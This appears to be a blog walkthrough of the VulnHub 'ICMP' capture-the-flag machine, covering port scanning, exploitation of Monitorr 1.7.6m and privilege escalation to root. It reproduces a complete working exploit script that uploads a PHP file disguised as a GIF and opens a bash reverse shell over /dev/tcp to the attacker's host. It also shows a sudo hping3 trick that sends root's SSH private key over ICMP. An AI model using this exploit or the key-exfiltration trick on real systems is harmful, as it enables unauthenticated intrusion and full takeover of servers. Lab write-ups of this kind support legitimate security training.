---
layout: post
title:  "VulnHub - ICMP"
date:   2021-03-07 10:10:05 +0300
categories: [vulnhub,walkthrough]
pin: false
tags: [exploitdb,monitorr,Enumeration,hping3,id_rsa]
---


You’ll find this vm in  `https://www.vulnhub.com/entry/icmp-1,633/`

## Port Scan

```bash
nmap 10.0.2.197 -p-
```

```sh
22/tcp open  ssh
80/tcp open  http
```

## Searchsploit

- If we check the port `80` we will see that it runs the `Monitorr` Software

```bash
searchsploit Monitorr
```

```sh            
  ---------------------------------------------- ---------------------------------
   Exploit Title                                |  Path
  ---------------------------------------------- ---------------------------------
  Monitorr 1.7.6m - Authorization Bypass        | php/webapps/48981.py
  Monitorr 1.7.6m - Remote Code Execution (Unau | php/webapps/48980.py
  ---------------------------------------------- ---------------------------------
```

## Python Script - Edited

```python                                                                                                
  #!/usr/bin/python
  # -*- coding: UTF-8 -*-

  # Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
  # Date: September 12, 2020
  # Exploit Author: Lyhin's Lab
  # Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
  # Software Link: https://github.com/Monitorr/Monitorr
  # Version: 1.7.6m
  # Tested on: Ubuntu 19

  import requests
  import os
  import sys

  if len (sys.argv) != 4:
  	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
  else:
      url = sys.argv[1] + "/mon/assets/php/upload.php"
      headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

      data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

      requests.post(url, headers=headers, data=data)

      print ("A shell script should be uploaded. Now we try to execute it")
      url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
      headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
      requests.get(url, headers=headers)
```

## Reverse Shell

- My VM

```bash
python3 48980.py http://10.0.2.197 10.0.2.15 5555
```
- Listener

```bash
nc -lvp 5555       
listening on [any] 5555 ...
connect to [10.0.2.15] from 10.0.2.197 [10.0.2.197] 46598
www-data@icmp:/var/www/html/mon/assets/data/usrimg$
```

## Enumeration

- reminder

```
crypt with crypt.php: done, it works
work on decrypt with crypt.php: howto?!?
```

```bash
cd devel
cat crypt.php

 <?php
  echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
  ?>
```

## SSH Login | USER

- credentials `fox` : `BUHNIJMONIBUVCYTTYVGBUHJNI`
- local.txt : c9db6c88939a2ae091c431a45fb1e59c


## Sudo | hping3
{% highlight sh %}
  $ sudo -l
  [sudo] password for fox:
  Matching Defaults entries for fox on icmp:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User fox may run the following commands on icmp:
      (root) /usr/sbin/hping3 --icmp *
      (root) /usr/bin/killall hping3
{% endhighlight %}

## Read root id_rsa using hping3

- Terminal `1`

```bash
sudo -u root /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --safe
```

- Terminal `2`

```bash
sudo -u root /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
```

- After running the above commands in terminal 1 the id_rsa of root will be printed

## Rooted

```bash
ssh -i id_rsa root@10.0.2.197
```
- proof.txt : 9377e773846aeabb51b37155e15cf638
